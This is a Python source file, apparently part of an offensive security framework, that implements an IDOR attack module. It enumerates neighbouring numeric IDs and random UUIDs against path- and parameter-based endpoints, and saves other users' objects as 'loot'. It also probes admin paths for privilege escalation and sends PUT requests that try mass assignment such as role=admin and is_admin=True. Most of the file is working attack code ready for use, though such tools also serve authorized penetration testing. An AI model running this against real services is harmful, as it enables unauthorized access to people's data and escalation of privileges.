"""IDOR module — enumerate object IDs and extract unauthorized data."""

from __future__ import annotations

import uuid as _uuid
from typing import Any, Dict, Iterator, List, Optional

from sentinel.models import AttackResult, EngagementSession
from sentinel.logger import log
from sentinel.modules.base import BaseModule
from sentinel.utils.http import request


def _idor_id_generator(base_id: Any, count: int = 50) -> Iterator[Any]:
    try:
        n = int(base_id)
        for i in range(max(1, n - count // 2), n + count // 2 + 1):
            if i != n:
                yield i
    except (ValueError, TypeError):
        pass
    # UUID guessing — yield sequential-looking UUIDs
    for _ in range(10):
        yield str(_uuid.uuid4())


class IDORModule(BaseModule):
    """Enumerate object IDs and extract unauthorized data through IDOR vulnerabilities."""

    name = "idor"

    def run(self, es: EngagementSession, **kwargs: object) -> List[AttackResult]:
        target_url: str = kwargs.get("target_url", "")  # type: ignore[assignment]
        target_id: Any = kwargs.get("target_id")
        id_param: str = kwargs.get("id_param", "")  # type: ignore[assignment]
        auth_headers_victim: Optional[Dict[str, str]] = kwargs.get("auth_headers_victim")  # type: ignore[assignment]

        results: List[AttackResult] = []
        scan_url = target_url or es.base_url
        extracted_objects: List[Dict[str, Any]] = []

        log(f"[IDOR] Enumerating around ID {target_id} at {scan_url}", "INFO")

        # 1. Direct path-based IDOR (e.g., /api/users/123 -> /api/users/124)
        if "{id}" in scan_url or str(target_id) in scan_url:
            base_url_pattern = scan_url.replace(str(target_id), "{id}")

            # Get reference response (legitimate)
            ref_url = base_url_pattern.replace("{id}", str(target_id))
            ref_resp = request(es, "GET", ref_url,
                               headers=auth_headers_victim if auth_headers_victim else {})
            ref_body = ref_resp.text[:500] if ref_resp else ""

            # Enumerate adjacent IDs
            success_count = 0
            for alt_id in _idor_id_generator(target_id, count=40):
                test_url = base_url_pattern.replace("{id}", str(alt_id))
                resp = request(es, "GET", test_url)
                if resp and resp.status_code == 200 and len(resp.text) > 10:
                    body = resp.text[:500]
                    # Check it's different from reference (different object)
                    if body != ref_body:
                        try:
                            data = resp.json()
                        except Exception:
                            data = {"raw": body[:200]}
                        extracted_objects.append({"id": alt_id, "url": test_url, "data": data})
                        success_count += 1
                        if success_count <= 3:
                            log(f"[IDOR] Extracted object {alt_id}: {str(data)[:80]}", "CRIT")

        # 2. Param-based IDOR (e.g., /api/profile?user_id=123)
        if id_param:
            ref_resp = request(es, "GET", scan_url, params={id_param: target_id})
            ref_body = ref_resp.text[:500] if ref_resp else ""

            for alt_id in _idor_id_generator(target_id, count=30):
                resp = request(es, "GET", scan_url, params={id_param: alt_id})
                if resp and resp.status_code == 200 and resp.text[:500] != ref_body and len(resp.text) > 10:
                    try:
                        data = resp.json()
                    except Exception:
                        data = {"raw": resp.text[:200]}
                    extracted_objects.append({"id": alt_id, "param": id_param, "data": data})
                    log(f"[IDOR] Param IDOR hit: {id_param}={alt_id}", "CRIT")

        # 3. Horizontal -> Vertical IDOR escalation
        # Try accessing admin/privileged endpoints with low-priv auth
        admin_paths = [
            scan_url.replace("/user/", "/admin/"),
            scan_url.replace("/profile/", "/admin/profile/"),
            scan_url.replace("/v1/me", "/v1/admin"),
            scan_url.replace("/api/user", "/api/admin"),
        ]
        for admin_url in admin_paths:
            if admin_url == scan_url:
                continue
            resp = request(es, "GET", admin_url)
            if resp and resp.status_code == 200:
                log(f"[IDOR] Vertical escalation! Admin endpoint accessible: {admin_url}", "CRIT")
                extracted_objects.append({"url": admin_url, "type": "vertical_escalation",
                                          "data": resp.text[:200]})
                results.append(AttackResult(
                    "idor", "vertical_escalation", "VULN",
                    url=admin_url, evidence=resp.text[:200],
                    severity="CRITICAL",
                    notes=f"Admin endpoint accessible without admin privileges: {admin_url}",
                ))

        # 4. Mass assignment / object manipulation
        post_mass = [
            ("role", "admin"), ("is_admin", True), ("permissions", ["admin"]),
            ("user_type", "administrator"), ("access_level", 9),
        ]
        for key, val in post_mass:
            resp = request(es, "PUT", scan_url,
                           json={id_param or "id": target_id, key: val})
            if resp and resp.status_code in (200, 201, 204):
                log(f"[IDOR] Mass assignment: {key}={val} accepted!", "CRIT")
                results.append(AttackResult(
                    "idor", "mass_assignment", "VULN",
                    url=scan_url, payload=f"{key}={val}",
                    evidence=resp.text[:200], severity="HIGH",
                    notes=f"Server accepted unauthorized {key}={val} via PUT",
                ))

        if extracted_objects:
            es.loot["idor"] = extracted_objects
            results.insert(0, AttackResult(
                "idor", "object_enumeration", "VULN",
                url=scan_url,
                evidence=f"Extracted {len(extracted_objects)} unauthorized objects",
                data=extracted_objects[:5],
                severity="HIGH",
                notes=f"IDOR: {len(extracted_objects)} unauthorized objects retrieved",
            ))
        elif not results:
            results.append(AttackResult("idor", "scan", "NOT_VULN",
                                        url=scan_url, notes="No IDOR vulnerability found"))
        return results
